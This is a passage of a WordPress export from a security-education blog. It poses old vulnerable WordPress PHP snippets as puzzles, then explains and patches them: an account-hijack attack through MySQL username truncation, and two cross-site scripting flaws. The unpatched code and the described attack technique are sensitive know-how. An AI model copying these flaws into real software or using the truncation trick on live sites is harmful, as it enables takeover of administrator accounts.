		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>2</wp:menu_order>
		<wp:post_type>nav_menu_item</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="nav_menu" nicename="blah"><![CDATA[Blah]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_menu_item_type</wp:meta_key>
			<wp:meta_value><![CDATA[taxonomy]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_menu_item_menu_item_parent</wp:meta_key>
			<wp:meta_value><![CDATA[0]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_menu_item_object_id</wp:meta_key>
			<wp:meta_value><![CDATA[16]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_menu_item_object</wp:meta_key>
			<wp:meta_value><![CDATA[category]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_menu_item_target</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_menu_item_classes</wp:meta_key>
			<wp:meta_value><![CDATA[a:1:{i:0;s:0:"";}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_menu_item_xfn</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_menu_item_url</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Choice of Enemies</title>
		<link>http://spotthevuln.com/2009/10/vulnerable-code-choice-of-enemies/</link>
		<pubDate>Mon, 12 Oct 2009 15:00:09 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=179</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote>I choose my friends for their good looks, my acquaintances for their good characters, and my enemies for their good intellects. A man cannot be too careful in the choice of his enemies.
- Oscar Wilde (1854 - 1900), The Picture of Dorian Gray, 1891</blockquote>
[ccnLe_php]

/**
* Removes characters from the username
*
* If $strict is true, only alphanumeric characters (as well as _, space, ., -, @) are returned.
*
* @since 2.0.0
*
* @param string $username The username to be sanitized.
* @param bool $strict If set limits $username to specific characters. Default false.
* @return string The sanitized username, after passing through filters.
*/
function sanitize_user( $username, $strict = false ) {
   $raw_username = $username;
   $username = strip_tags($username);
   // Kill octets
   $username = preg_replace('|%([a-fA-F0-9][a-fA-F0-9])|', '', $username);
   $username = preg_replace('/&amp;.+?;/', '', $username); // Kill entities

   // If strict, reduce to ASCII for max portability.
   if ( $strict )
   $username = preg_replace('|[^a-z0-9 _.\-@]|i', '', $username);

   return apply_filters('sanitize_user', $username, $raw_username, $strict);
}
[/ccnLe_php] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>179</wp:post_id>
		<wp:post_date>2009-10-12 08:00:09</wp:post_date>
		<wp:post_date_gmt>2009-10-12 15:00:09</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>vulnerable-code-choice-of-enemies</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_page_title</wp:meta_key>
			<wp:meta_value><![CDATA[Vulnerable Source Code]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_description</wp:meta_key>
			<wp:meta_value><![CDATA[Can you identify the security vulnerability in this code snippet?]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/cPOUFY]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[63f093582dfe0d4d4eda9d3f88044ed1]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>41</wp:comment_id>
			<wp:comment_author><![CDATA[pradeep]]></wp:comment_author>
			<wp:comment_author_email>mailme@mail.me</wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP>24.7.118.166</wp:comment_author_IP>
			<wp:comment_date>2009-10-12 23:10:02</wp:comment_date>
			<wp:comment_date_gmt>2009-10-13 06:10:02</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[sanitize_user function will strip off all the characters in $username!!!]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Choice of Enemies - SQL Injection through Truncation</title>
		<link>http://spotthevuln.com/2009/10/choice-of-enemies-sql-injection-throughtruncation/</link>
		<pubDate>Fri, 16 Oct 2009 15:00:05 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=182</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
<strong>Affected Software:</strong> Wordpress
<strong>Fixed in Version:</strong> 2.6.2
<strong>Issue Type:</strong> <a href="http://spotthevuln.com/category/vulnerability/sql-injection/">SQL Injection</a> through MySQL Column Truncation
<strong>Original Code:</strong> <a href="http://spotthevuln.com/2009/10/vulnerable-code-choice-of-enemies/">Found Here</a>
<h2>Description</h2>
This was a tricky SQL Injection through truncation issue which affected WordPress installations using MySQL back ends (which seem to be the majority of WordPress installations).

When a user is registered inside WordPress, the username value undergoes some sanitization/validation before being inserted into the WordPress database.  One of the routines that validates usernames is named sanitize_user().  Inside of the sanitize_user() function, WordPress attempts to sanitize the username by stripping certain characters (entities and octets).

The sanitization routine failed to properly validate the length of the username or whether whitespace characters were included in the username. Before the application allowed the newly created username to be inserted into the database, it first checked to see if that username already existed in the WordPress database.  The default comparison operation done by MySQL ignored whitespace so when WordPress issues a query for a username of “admin   “ (admin followed by four spaces), it would match a query for “admin” (admin followed by no spaces). The default data type for the WordPress username column also limited the column length to 16 characters.

Knowing this, an attacker could create a new user account named “admin           x” (admin followed by eleven spaces and an arbitrary character, resulting in 17 characters total).  When the application would query the WordPress database to check to see if this particular username had been taken, it would indicate that this particular username was not in use.  However, when the application attempted to insert the newly created username into the WordPress database, the last character in the username would be truncated by the MySQL database because the username column had a maximum length of 16 and the username being inserted had a length of 17.  In default installation of MySQL, this would NOT raise an error.

The truncated admin username allows for the creation of two accounts named “admin” in the WordPress user database.  One admin account is attacker controlled and the other belongs to the actual admin of the WordPress installation.  An exploitable condition arises when security checks are done against one admin account (the attacker account, in which the attacker knows all the account details), but later serve data/content from the other admin account (data from the actual WordPress administrator), giving the attacker the ability to hijack the WordPress administrator account.  For more information on SQL truncation read <a href="http://www.suspekt.org/2008/08/18/mysql-and-sql-column-truncation-vulnerabilities/">Stefan Esser's MySQL truncation issues</a>.

Interestingly, WordPress had a conditional which would reduce the username to only ASCII characters in place before this issue was discovered and exploited in the wild.  This conditional would have likely eliminated this vulnerability; however this conditional is disabled by default.  Also, the code fix implemented by the WordPress team did not validate length (only stripped whitespace), keeping the possibility of truncation issues open (ie. truncation issues against users with usernames of 16 characters).
<h2>Developers Solution</h2>
[cc lang="diff"]

/**
* Removes characters from the username
*
* If $strict is true, only alphanumeric characters (as well as _, space, ., -, @) are returned.
*
* @since 2.0.0
*
* @param string $username The username to be sanitized.
* @param bool $strict If set limits $username to specific characters. Default false.
* @return string The sanitized username, after passing through filters.
*/
function sanitize_user( $username, $strict = false ) {
$raw_username = $username;
$username = strip_tags($username);
// Kill octets
$username = preg_replace('|%([a-fA-F0-9][a-fA-F0-9])|', '', $username);
$username = preg_replace('/&amp;.+?;/', '', $username); // Kill entities

// If strict, reduce to ASCII for max portability.
if ( $strict )
$username = preg_replace('|[^a-z0-9 _.\-@]|i', '', $username);

+       // Consolidate contiguous whitespace
+       $username = preg_replace('|\s+|', ' ', $username);

return apply_filters('sanitize_user', $username, $raw_username, $strict);
}
[/cc] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>182</wp:post_id>
		<wp:post_date>2009-10-16 08:00:05</wp:post_date>
		<wp:post_date_gmt>2009-10-16 15:00:05</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>choice-of-enemies-sql-injection-throughtruncation</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="category" nicename="sql-injection"><![CDATA[SQL Injection]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#sqlinjection #mysqltruncation]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_page_title</wp:meta_key>
			<wp:meta_value><![CDATA[SQL injection throught MySQL Truncation Vulnerability Code Example]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_description</wp:meta_key>
			<wp:meta_value><![CDATA[SQL Injection Vulnerability Code Example]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[14e6f77d7e4383eeef0bb19decd0a724]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/1hBPTL]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Attack the Hot Fudge Sundae - XSS</title>
		<link>http://spotthevuln.com/2009/10/hot-fudge-sundae-xss/</link>
		<pubDate>Fri, 09 Oct 2009 15:00:11 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=191</guid>
		<description></description>
		<content:encoded><![CDATA[<div>
<h2>Background</h2>
<strong>Affected Software:</strong> <a href="http://spotthevuln.com/category/software/wordpress/">Wordpress</a>

<strong>Fixed in:</strong> 2.8

<strong>Issue Type: </strong><a href="http://spotthevuln.com/category/vulnerability/xss/">Cross Site Scripting</a></div>
<strong>Original Code: </strong><a href="http://spotthevuln.com/2009/10/vulnerable-source-code-hot-fudge-sundae/">Found Here</a>
<h2>Description</h2>
<div>

The vulnerable code takes explicit actions to escape Arrays before echoing the contents of the Array back to the user.

Objects however, are NOT explicitly escaped in the vulnerable code. If an attacker could pass their payload as a PHP object, it would be echoed back to the user without encoding or sanitation.

The WordPress developers simple placed conditional logic to determine whether the data being passed was from an array or an object and escaped the data as needed, protecting the user from XSS.</div>
<h2>Developers Solution</h2>
[cc lang="diff"]

/**
* Update a post with new post data.
*
* The date does not have to be set for drafts. You can set the date and it will
* not be overridden.
*
* @since 1.0.0
*
- * @param array|object $postarr Post data.
+ * @param array|object $postarr Post data. Arrays are expected to be escaped, objects are not.
* @return int 0 on failure, Post ID on success.
*/
function wp_update_post($postarr = array()) {
-       if ( is_object($postarr) )
+       if ( is_object($postarr) ) {
+               // non-escaped post was passed
$postarr = get_object_vars($postarr);
+               $postarr = add_magic_quotes($postarr);
+       }
// First, get all of the original fields
$post = wp_get_single_post($postarr['ID'], ARRAY_A);

// Escape data pulled from DB.
$post = add_magic_quotes($post);

// Passed post category list overwrites existing category list if not empty.
if ( isset($postarr['post_category']) &amp;&amp; is_array($postarr['post_category'])
&amp;&amp; 0 != count($postarr['post_category']) )
$post_cats = $postarr['post_category'];
else
$post_cats = $post['post_category'];

// Drafts shouldn't be assigned a date unless explicitly done so by the user
if ( in_array($post['post_status'], array('draft', 'pending')) &amp;&amp; empty($postarr['edit_date']) &amp;&amp;
('0000-00-00 00:00:00' == $post['post_date_gmt']) )
$clear_date = true;
else
$clear_date = false;

// Merge old and new fields with new fields overwriting old ones.
$postarr = array_merge($post, $postarr);
$postarr['post_category'] = $post_cats;
if ( $clear_date ) {
$postarr['post_date'] = current_time('mysql');
$postarr['post_date_gmt'] = '';
}

if ($postarr['post_type'] == 'attachment')
return wp_insert_attachment($postarr);

return wp_insert_post($postarr);
}

[/cc] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>191</wp:post_id>
		<wp:post_date>2009-10-09 08:00:11</wp:post_date>
		<wp:post_date_gmt>2009-10-09 15:00:11</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>hot-fudge-sundae-xss</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_page_title</wp:meta_key>
			<wp:meta_value><![CDATA[Cross-Site Scripting (XSS) Vulnerability Code Example]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_description</wp:meta_key>
			<wp:meta_value><![CDATA[BackgroundAffected Software: WordpressFixed in: 2.]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[b33df3a090a5c54b41cc3633dea550c8]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/12smd1]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Sacred Facts</title>
		<link>http://spotthevuln.com/2009/11/vulnerable-code-sacred-facts/</link>
		<pubDate>Mon, 16 Nov 2009 22:16:14 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=197</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote>Comments are free but facts are sacred.
- Charles Prestwich Scott</blockquote>
[ccnLe_php]

function _wp_dashboard_recent_comments_row( &amp;$comment, $show_date = true ) {
$GLOBALS['comment'] =&amp; $comment;

$comment_post_url = get_edit_post_link( $comment-&gt;comment_post_ID );
$comment_post_title = get_the_title( $comment-&gt;comment_post_ID );
$comment_post_link = "&lt;a href='$comment_post_url'&gt;$comment_post_title&lt;/a&gt;";
$comment_link = '&lt;a href="' . get_comment_link() . '"&gt;#&lt;/a&gt;';

$delete_url = clean_url( wp_nonce_url( "comment.php?action=deletecomment&amp;p=$comment-&gt;comment_post_ID&amp;c=$comment-&gt;comment_ID", "delete-comment_$comment-&gt;comment_ID" ) );
$approve_url = clean_url( wp_nonce_url( "comment.php?action=approvecomment&amp;p=$comment-&gt;comment_post_ID&amp;c=$comment-&gt;comment_ID", "approve-comment_$comment-&gt;comment_ID" ) );
$unapprove_url = clean_url( wp_nonce_url( "comment.php?action=unapprovecomment&amp;p=$comment-&gt;comment_post_ID&amp;c=$comment-&gt;comment_ID", "unapprove-comment_$comment-&gt;comment_ID" ) );
$spam_url = clean_url( wp_nonce_url( "comment.php?action=deletecomment&amp;dt=spam&amp;p=$comment-&gt;comment_post_ID&amp;c=$comment-&gt;comment_ID", "delete-comment_$comment-&gt;comment_ID" ) );

$actions = array();

$actions_string = '';
if ( current_user_can('edit_post', $comment-&gt;comment_post_ID) ) {
$actions['approve'] = "&lt;a href='$approve_url' class='dim:the-comment-list:comment-$comment-&gt;comment_ID:unapproved:e7e7d3:e7e7d3:new=approved vim-a' title='" . __( 'Approve this comment' ) . "'&gt;" . __( 'Approve' ) . '&lt;/a&gt;';
$actions['unapprove'] = "&lt;a href='$unapprove_url' class='dim:the-comment-list:comment-$comment-&gt;comment_ID:unapproved:e7e7d3:e7e7d3:new=unapproved vim-u' title='" . __( 'Unapprove this comment' ) . "'&gt;" . __( 'Unapprove' ) . '&lt;/a&gt;';
$actions['edit'] = "&lt;a href='comment.php?action=editcomment&amp;amp;c={$comment-&gt;comment_ID}' title='" . __('Edit comment') . "'&gt;". __('Edit') . '&lt;/a&gt;';
//$actions['quickedit'] = '&lt;a onclick="commentReply.open(\''.$comment-&gt;comment_ID.'\',\''.$comment-&gt;comment_post_ID.'\',\'edit\');return false;" title="'.__('Quick Edit').'" href="#"&gt;' . __('Quick&amp;nbsp;Edit') . '&lt;/a&gt;';
$actions['reply'] = '&lt;a onclick="commentReply.open(\''.$comment-&gt;comment_ID.'\',\''.$comment-&gt;comment_post_ID.'\');return false;" title="'.__('Reply to this comment').'" href="#"&gt;' . __('Reply') . '&lt;/a&gt;';
$actions['spam'] = "&lt;a href='$spam_url' class='delete:the-comment-list:comment-$comment-&gt;comment_ID::spam=1 vim-s vim-destructive' title='" . __( 'Mark this comment as spam' ) . "'&gt;" . /* translators: mark as spam link */  _x( 'Spam', 'verb' ) . '&lt;/a&gt;';
$actions['delete'] = "&lt;a href='$delete_url' class='delete:the-comment-list:comment-$comment-&gt;comment_ID delete vim-d vim-destructive'&gt;" . __('Delete') . '&lt;/a&gt;';

$actions = apply_filters( 'comment_row_actions', $actions, $comment );

$i = 0;
[/ccnLe_php] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>197</wp:post_id>
		<wp:post_date>2009-11-16 15:16:14</wp:post_date>
		<wp:post_date_gmt>2009-11-16 22:16:14</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>vulnerable-code-sacred-facts</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[no]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_page_title</wp:meta_key>
			<wp:meta_value><![CDATA[Vulnerable Source Code]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_description</wp:meta_key>
			<wp:meta_value><![CDATA[Can you identify the security vulnerability in this code snippet?]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[35665155f04282c61b4e12b0676ca3a9]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/2AXMfv]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Sacred Facts - XSS</title>
		<link>http://spotthevuln.com/2009/11/sacred-facts-xss/</link>
		<pubDate>Fri, 20 Nov 2009 15:00:17 +0000</pubDate>
		<dc:creator>BrettH</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=199</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
<strong>Affected Software: WordPress</strong>

<strong>Fixed in Version: 2.8</strong>

<strong>Issue Type: Cross Site Scripting</strong>

<strong>Original Code: </strong><a href="http://spotthevuln.com/2009/11/vulnerable-code-sacred-facts/">Found Here</a>
<h2>Description</h2>
The WordPress developers fixed a persistent Cross Site Scripting vulnerability with this code fix.  Examining the vulnerable code, we see that the $comment_post_title variable is assigned an un-sanitized value from get_the_title( $comment-&gt;comment_post_ID ).  $comment_post_title is then immediately used in to build HTML markup (used as the text for a HREF tag) and assigned to the $comment_post_link variable.  The $comment_post_link variable with the tainted value is eventually used in the HTML markup in a WordPress page.  By placing script into a blog post title, a contributor could use the persistent cross site scripting vulnerability to elevate to WordPress Administrator.

 

The WordPress team implemented the PHP strip_tags() function to strip HTML tags from the post title before assigning to the $comment_post_title variable.  More information related to the PHP strip_tags() API can be found <a title="PHP strip_tags" href="http://us2.php.net/manual/en/function.strip-tags.php" target="_blank">here</a>.  It should be noted that the documentation for strip_tags() provides the following warning:
<blockquote>Because <strong>strip_tags()</strong> does not actually validate the HTML, partial, or broken tags can result in the removal of more text/data than expected.</blockquote>
Interesting indeed…
<h2>Developers Solution</h2>
[cce lang="diff"]

function _wp_dashboard_recent_comments_row( &amp;$comment, $show_date = true ) {
$GLOBALS['comment'] =&amp; $comment;

$comment_post_url = get_edit_post_link( $comment-&gt;comment_post_ID );
-       $comment_post_title = get_the_title( $comment-&gt;comment_post_ID );
+       $comment_post_title = strip_tags(get_the_title( $comment-&gt;comment_post_ID ));
$comment_post_link = "&lt;a href='$comment_post_url'&gt;$comment_post_title&lt;/a&gt;";
$comment_link = '&lt;a href="' . get_comment_link() . '"&gt;#&lt;/a&gt;';

$delete_url = clean_url( wp_nonce_url( "comment.php?action=deletecomment&amp;p=$comment-&gt;comment_post_ID&amp;c=$comment-&gt;comment_ID", "delete-comment_$comment-&gt;comment_ID" ) );
$approve_url = clean_url( wp_nonce_url( "comment.php?action=approvecomment&amp;p=$comment-&gt;comment_post_ID&amp;c=$comment-&gt;comment_ID", "approve-comment_$comment-&gt;comment_ID" ) );
$unapprove_url = clean_url( wp_nonce_url( "comment.php?action=unapprovecomment&amp;p=$comment-&gt;comment_post_ID&amp;c=$comment-&gt;comment_ID", "unapprove-comment_$comment-&gt;comment_ID" ) );
$spam_url = clean_url( wp_nonce_url( "comment.php?action=deletecomment&amp;dt=spam&amp;p=$comment-&gt;comment_post_ID&amp;c=$comment-&gt;comment_ID", "delete-comment_$comment-&gt;comment_ID" ) );

$actions = array();

$actions_string = '';
if ( current_user_can('edit_post', $comment-&gt;comment_post_ID) ) {
$actions['approve'] = "&lt;a href='$approve_url' class='dim:the-comment-list:comment-$comment-&gt;comment_ID:unapproved:e7e7d3:e7e7d3:new=approved vim-a' title='" . __( 'Approve this comment' ) . "'&gt;" . __( 'Approve' ) . '&lt;/a&gt;';
$actions['unapprove'] = "&lt;a href='$unapprove_url' class='dim:the-comment-list:comment-$comment-&gt;comment_ID:unapproved:e7e7d3:e7e7d3:new=unapproved vim-u' title='" . __( 'Unapprove this comment' ) . "'&gt;" . __( 'Unapprove' ) . '&lt;/a&gt;';
$actions['edit'] = "&lt;a href='comment.php?action=editcomment&amp;amp;c={$comment-&gt;comment_ID}' title='" . __('Edit comment') . "'&gt;". __('Edit') . '&lt;/a&gt;';
//$actions['quickedit'] = '&lt;a onclick="commentReply.open(''.$comment-&gt;comment_ID.'',''.$comment-&gt;comment_post_ID.'','edit');return false;" title="'.__('Quick Edit').'" href="#"&gt;' . __('Quick&amp;nbsp;Edit') . '&lt;/a&gt;';
$actions['reply'] = '&lt;a onclick="commentReply.open(''.$comment-&gt;comment_ID.'',''.$comment-&gt;comment_post_ID.'');return false;" title="'.__('Reply to this comment').'" href="#"&gt;' . __('Reply') . '&lt;/a&gt;';
$actions['spam'] = "&lt;a href='$spam_url' class='delete:the-comment-list:comment-$comment-&gt;comment_ID::spam=1 vim-s vim-destructive' title='" . __( 'Mark this comment as spam' ) . "'&gt;" . /* translators: mark as spam link */  _x( 'Spam', 'verb' ) . '&lt;/a&gt;';
$actions['delete'] = "&lt;a href='$delete_url' class='delete:the-comment-list:comment-$comment-&gt;comment_ID delete vim-d vim-destructive'&gt;" . __('Delete') . '&lt;/a&gt;';

$actions = apply_filters( 'comment_row_actions', $actions, $comment );

$i = 0;
[/cce] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>199</wp:post_id>
		<wp:post_date>2009-11-20 08:00:17</wp:post_date>
		<wp:post_date_gmt>2009-11-20 15:00:17</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>sacred-facts-xss</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="persistent"><![CDATA[Persistent]]></category>
		<category domain="post_tag" nicename="php"><![CDATA[PHP]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="post_tag" nicename="strip_tags"><![CDATA[strip_tags]]></category>
		<category domain="category" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<category domain="post_tag" nicename="wordpress"><![CDATA[Wordpress]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[no]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_page_title</wp:meta_key>
			<wp:meta_value><![CDATA[Cross-Site Scripting (XSS) Vulnerability Code Example]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_headspace_description</wp:meta_key>
			<wp:meta_value><![CDATA[Cross-Site Scripting (XSS) Vulnerability Code Example]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[70fc6ce5036dece2715d76c3e0b15e65]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/8Ln0A7]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>One Damn Thing</title>
		<link>http://spotthevuln.com/2009/10/vulnerable-code-one-damn-thing/</link>
		<pubDate>Mon, 19 Oct 2009 15:00:55 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=202</guid>
